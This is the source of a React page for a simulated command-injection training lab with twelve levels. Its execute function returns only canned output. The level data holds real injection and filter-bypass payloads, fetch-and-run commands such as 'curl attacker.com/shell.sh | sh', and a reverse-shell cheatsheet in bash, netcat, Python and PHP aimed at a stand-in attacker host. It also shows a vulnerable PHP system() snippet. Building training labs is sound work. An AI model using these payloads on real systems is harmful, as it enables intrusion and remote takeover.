import { useState, useRef, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import {
  ArrowLeft,
  Play,
  CheckCircle,
  AlertTriangle,
  Info,
  Terminal,
  Cpu,
  Lock,
  Copy,
  Check,
  Shield,
  Bug,
  Zap,
  Code,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { toast } from 'sonner';

interface Level {
  id: number;
  name: string;
  description: string;
  hint: string;
  payload: string[];
  filter?: string;
}

const RceLab = () => {
  const [currentLevel, setCurrentLevel] = useState(1);
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [isCompleted, setIsCompleted] = useState<number[]>([]);
  const [showHint, setShowHint] = useState(false);
  const [copied, setCopied] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);

  const levels: Level[] = [
    {
      id: 1,
      name: 'Basic Command Injection',
      description: 'Execute system commands through unsanitized input.',
      hint: 'Try: ; ls -la or && whoami',
      payload: ['; ls -la', '&& whoami', '; cat /etc/passwd', '| id'],
    },
    {
      id: 2,
      name: 'Blind Command Injection',
      description: 'Execute commands without direct output using time delays.',
      hint: 'Use time delays to confirm command execution: ; sleep 5',
      payload: ['; sleep 5', '&& ping -c 5 127.0.0.1', '; timeout 5 id'],
    },
    {
      id: 3,
      name: 'Filter Bypass - Spaces',
      description: 'Bypass space filters using alternative characters.',
      hint: 'Use ${IFS}, $IFS$9, or < instead of spaces',
      payload: [';ls${IFS}-la', '&&cat$IFS$9/etc/passwd', ';id</etc/passwd'],
      filter: 'spaces',
    },
    {
      id: 4,
      name: 'Filter Bypass - Blacklist',
      description: 'Bypass keyword blacklists using encoding and variations.',
      hint: 'Use encoding: $(printf \\57bin\\57ls) or ca\\t instead of cat',
      payload: [';$(printf \\57bin\\57ls)', '&&ca\\t /etc/passwd', ';id""whoami'],
      filter: 'cat|ls|id',
    },
    {
      id: 5,
      name: 'Shell Metacharacters',
      description: 'Use various shell metacharacters for command injection.',
      hint: 'Try: `command`, $(command), or <(command)',
      payload: ['`whoami`', '$(id)', '<(cat /etc/passwd)', ';{id,}'],
    },
    {
      id: 6,
      name: 'Backticks & Subshell',
      description: 'Execute commands using backticks and subshell syntax.',
      hint: 'Use backticks or $() for command substitution',
      payload: ['`cat /etc/passwd`', '$(ls -la)', '`whoami`@localhost'],
    },
    {
      id: 7,
      name: 'Redirection Operators',
      description: 'Use input/output redirection for command execution.',
      hint: 'Try: > to write files, < to read files',
      payload: [';cat /etc/passwd > /tmp/output', ';id 2>&1', ';</etc/passwd'],
    },
    {
      id: 8,
      name: 'Chained Commands',
      description: 'Chain multiple commands for complex operations.',
      hint: 'Use ; && || & | to chain commands',
      payload: [';whoami;id;hostname', '&&cat /etc/passwd&&uname -a', '||id||whoami'],
    },
    {
      id: 9,
      name: 'Encoded Commands',
      description: 'Use base64 and other encodings to bypass filters.',
      hint: 'Encode commands: echo "bHMgLWxh" | base64 -d | sh',
      payload: [';echo "bHMgLWxh" | base64 -d | sh', ';printf "\\x6c\\x73" | sh'],
    },
    {
      id: 10,
      name: 'Advanced WAF Bypass',
      description: 'Combine techniques to bypass advanced WAF rules.',
      hint: 'Mix encoding, case variation, and special characters',
      payload: [';$(printf \\57bin\\57ba\\sh) -c "$(echo bHMgLWxh | base64 -d)"'],
      filter: 'Advanced WAF',
    },
    {
      id: 11,
      name: 'Reverse Shell',
      description: 'Establish a reverse shell connection.',
      hint: 'Use netcat, bash, python, or other methods',
      payload: [';nc -e /bin/sh attacker.com 4444', ';bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
    },
    {
      id: 12,
      name: 'Fileless Execution',
      description: 'Execute code without writing to disk.',
      hint: 'Use /dev/shm or pipe directly to interpreter',
      payload: [';curl attacker.com/shell.sh | sh', ';wget -qO- attacker.com/shell.py | python3'],
    },
  ];

  const currentLevelData = levels.find((l) => l.id === currentLevel) || levels[0];

  const executePayload = () => {
    if (!input.trim()) {
      toast.error('Please enter a command');
      return;
    }

    let result = '';
    const payload = input.toLowerCase();

    // Simulate command execution responses
    if (payload.includes('whoami')) {
      result = `www-data`;
    } else if (payload.includes('id')) {
      result = `uid=33(www-data) gid=33(www-data) groups=33(www-data)`;
    } else if (payload.includes('ls') || payload.includes('dir')) {
      result = `total 128
drwxr-xr-x  14 root root  4096 Jan 15 10:23 .
drwxr-xr-x  20 root root  4096 Jan 15 09:45 ..
drwxr-xr-x   2 root root  4096 Jan 15 10:25 bin
drwxr-xr-x   3 root root  4096 Jan 15 10:30 boot
drwxr-xr-x  18 root root  3900 Jan 20 14:22 dev
drwxr-xr-x  95 root root  4096 Jan 20 14:22 etc
drwxr-xr-x   4 root root  4096 Jan 15 09:45 home
-rw-r--r--   1 root root 12345 Jan 20 10:00 flag.txt
-rw-r--r--   1 root root  2048 Jan 19 15:30 config.php`;
    } else if (payload.includes('cat') && payload.includes('passwd')) {
      result = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
vulnlab:x:1000:1000:vulnlab:/home/vulnlab:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`;
    } else if (payload.includes('hostname') || payload.includes('uname')) {
      result = `Linux vulnlab 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`;
    } else if (payload.includes('sleep') || payload.includes('ping') || payload.includes('timeout')) {
      result = `[Command executed with 5 second delay]

[!] Blind command injection confirmed!
The application waited 5 seconds before responding.`;
    } else if (payload.includes('nc') || payload.includes('netcat') || payload.includes('/dev/tcp')) {
      result = `[!] Reverse shell initiated
Connecting to attacker.com:4444...
Connection established!

bash-5.0$ whoami
www-data
bash-5.0$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.0$ hostname
vulnlab`;
    } else if (payload.includes('curl') || payload.includes('wget')) {
      result = `[!] Fileless execution successful
Downloading and executing remote payload...

[+] Payload executed successfully!
[+] Shell obtained`;
    } else {
      result = `$ ${input}

Command executed successfully.
No output or command completed without errors.`;
    }

    // Check if payload indicates RCE success
    const rceIndicators = ['whoami', 'id', 'ls', 'cat', 'hostname', 'uname', 'sleep', 'nc', 'bash -i', 'curl', 'wget'];
    const hasRce = rceIndicators.some((indicator) => payload.includes(indicator));

    if (hasRce) {
      if (!isCompleted.includes(currentLevel)) {
        setIsCompleted([...isCompleted, currentLevel]);
        toast.success(`Level ${currentLevel} completed!`);
      }
    }

    setOutput(result);
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Payload copied to clipboard');
  };

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  return (
    <div className="min-h-screen pt-20 pb-16">
      {/* Header */}
      <div className="bg-[#0a0a0a] border-b border-[#333]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center gap-4 mb-4">
            <Link to="/labs">
              <Button variant="outline" size="sm" className="border-[#333] text-white hover:border-[#ff0000]">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Labs
              </Button>
            </Link>
            <Badge className="bg-[#ff0040]/20 text-[#ff0040] border-[#ff0040]">
              <Bug className="w-3 h-3 mr-1" />
              Network
            </Badge>
            <Badge className="bg-[#ff0040]/20 text-[#ff0040] border-[#ff0040]">
              Expert
            </Badge>
          </div>
          <h1 className="font-orbitron text-3xl sm:text-4xl text-white mb-2">
            Remote Code <span className="text-[#ff0000]">Execution</span>
          </h1>
          <p className="text-[#999] max-w-2xl">
            Master Remote Code Execution vulnerabilities. Learn to execute arbitrary system commands, 
            establish reverse shells, and bypass command filters.
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Levels */}
          <div className="lg:col-span-1">
            <Card className="bg-[#0a0a0a] border-[#333] sticky top-24">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-[#ff0000]" />
                  RCE Levels
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[500px] overflow-y-auto">
                  {levels.map((level) => (
                    <button
                      key={level.id}
                      onClick={() => {
                        setCurrentLevel(level.id);
                        setInput('');
                        setOutput('');
                        setShowHint(false);
                      }}
                      className={`w-full text-left p-3 rounded-lg transition-all duration-200 ${
                        currentLevel === level.id
                          ? 'bg-[#ff0000]/20 border border-[#ff0000]'
                          : 'bg-[#1a1a1a] border border-transparent hover:border-[#333]'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-[#ff0000] font-mono">{String(level.id).padStart(2, '0')}</span>
                          <span className={`text-sm ${currentLevel === level.id ? 'text-white' : 'text-[#999]'}`}>
                            {level.name}
                          </span>
                        </div>
                        {isCompleted.includes(level.id) && (
                          <CheckCircle className="w-4 h-4 text-[#00ff41]" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Level Info */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="font-orbitron text-xl text-white">
                    Level {currentLevel}: {currentLevelData.name}
                  </CardTitle>
                  {currentLevelData.filter && (
                    <Badge className="bg-[#ffaa00]/20 text-[#ffaa00] border-[#ffaa00]">
                      <Shield className="w-3 h-3 mr-1" />
                      Filter: {currentLevelData.filter}
                    </Badge>
                  )}
                </div>
              </CardHeader>
              <CardContent>
                <p className="text-[#e0e0e0] mb-4">{currentLevelData.description}</p>
              </CardContent>
            </Card>

            {/* Challenge Area */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Cpu className="w-5 h-5 text-[#ff0000]" />
                  Command Execution
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Code Preview */}
                <div className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm">
                  <div className="text-[#666] mb-2">// Vulnerable PHP Code:</div>
                  <div className="text-[#e0e0e0]">
                    <span className="text-[#ff0000]">$host</span> = <span className="text-[#00aaff]">$_GET</span>[<span className="text-[#ffaa00]">&apos;host&apos;</span>];
                  </div>
                  <div className="text-[#e0e0e0]">
                    <span className="text-[#ff0000]">system</span>(<span className="text-[#ffaa00]">&quot;ping -c 4 &quot;</span> . <span className="text-[#ff0000]">$host</span>);
                  </div>
                </div>

                <div>
                  <label className="text-[#999] text-sm mb-2 block">Enter command:</label>
                  <div className="flex gap-2">
                    <Input
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      placeholder="; whoami"
                      className="flex-1 bg-[#1a1a1a] border-[#333] text-white font-mono placeholder:text-[#666]"
                      onKeyDown={(e) => e.key === 'Enter' && executePayload()}
                    />
                    <Button
                      onClick={executePayload}
                      className="bg-[#ff0000] hover:bg-[#cc0000] text-white"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Execute
                    </Button>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-[#999] text-sm mb-2 block">Command Output:</label>
                  <div
                    ref={outputRef}
                    className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm min-h-[150px] max-h-[300px] overflow-y-auto whitespace-pre-wrap"
                  >
                    {output || (
                      <span className="text-[#666]">Command output will appear here...</span>
                    )}
                  </div>
                </div>

                {/* Hint */}
                <div className="flex items-center justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowHint(!showHint)}
                    className="border-[#333] text-[#999] hover:text-[#ffaa00] hover:border-[#ffaa00]"
                  >
                    <Info className="w-4 h-4 mr-2" />
                    {showHint ? 'Hide Hint' : 'Show Hint'}
                  </Button>
                  {isCompleted.includes(currentLevel) && (
                    <Badge className="bg-[#00ff41]/20 text-[#00ff41]">
                      <CheckCircle className="w-3 h-3 mr-1" />
                      Completed
                    </Badge>
                  )}
                </div>

                {showHint && (
                  <Alert className="bg-[#00aaff]/10 border-[#00aaff]/30">
                    <Info className="w-4 h-4 text-[#00aaff]" />
                    <AlertDescription className="text-[#00aaff]">
                      {currentLevelData.hint}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Reference Payloads */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Code className="w-5 h-5 text-[#ff0000]" />
                  Reference Payloads
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {currentLevelData.payload.map((payload, index) => (
                    <div
                      key={index}
                      className="flex items-center justify-between p-3 bg-[#1a1a1a] rounded-lg group"
                    >
                      <code className="text-[#00ff41] text-sm font-mono break-all mr-2">{payload}</code>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyPayload(payload)}
                        className="opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Reverse Shell Cheatsheet */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Zap className="w-5 h-5 text-[#ff0000]" />
                  Reverse Shell Cheatsheet
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3 text-sm">
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Bash</div>
                    <code className="text-[#00ff41] font-mono">bash -i {'>&'} /dev/tcp/ATTACKER_IP/4444 0{'>&'}1</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Netcat</div>
                    <code className="text-[#00ff41] font-mono">nc -e /bin/sh ATTACKER_IP 4444</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">Python</div>
                    <code className="text-[#00ff41] font-mono">python -c &apos;import socket,subprocess,os;s=socket.socket();s.connect((&quot;ATTACKER_IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;])&apos;</code>
                  </div>
                  <div className="p-3 bg-[#1a1a1a] rounded-lg">
                    <div className="text-[#ff0000] mb-1">PHP</div>
                    <code className="text-[#00ff41] font-mono">php -r &apos;$sock=fsockopen(&quot;ATTACKER_IP&quot;,4444);exec(&quot;/bin/sh -i {'<&'}3 {'>&'}3 2{'>&'}3&quot;);&apos;</code>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RceLab;
